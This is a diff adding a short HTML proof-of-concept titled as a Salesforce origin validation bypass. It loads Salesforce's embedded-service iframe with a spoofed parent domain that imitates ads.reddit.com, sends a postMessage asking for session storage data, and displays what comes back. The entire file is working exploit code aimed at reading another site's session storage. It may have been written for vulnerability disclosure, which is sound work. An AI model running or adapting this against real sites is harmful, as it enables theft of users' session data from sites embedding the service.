@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Salesforce Origin Validation Bypass PoC</h2>
+
+    <iframe
+      id="sfdcFrame"
+      src="https://service.force.com/embeddedservice/5.0/esw.html?parent=https://ads.reddit.com.wangdubruh.xyz"
+      width="600"
+      height="400"
+    ></iframe>
+
+    <script>
+      const iframe = document.getElementById("sfdcFrame");
+
+      iframe.onload = () => {
+        console.log("[+] Iframe loaded");
+
+        iframe.contentWindow.postMessage(
+          {
+            method: "getSessionStorageData",
+            deploymentId: "test-bypass",
+            domain: "ads.reddit.com"
+          },
+          "*"
+        );
+      };
+
+      window.addEventListener("message", (e) => {
+        console.log("[📩] Message from iframe:", e.data);
+        document.body.insertAdjacentHTML(
+          "beforeend",
+          `<pre>${JSON.stringify(e.data, null, 2)}</pre>`
+        );
+      });
+    </script>
+  </body>
+</html>
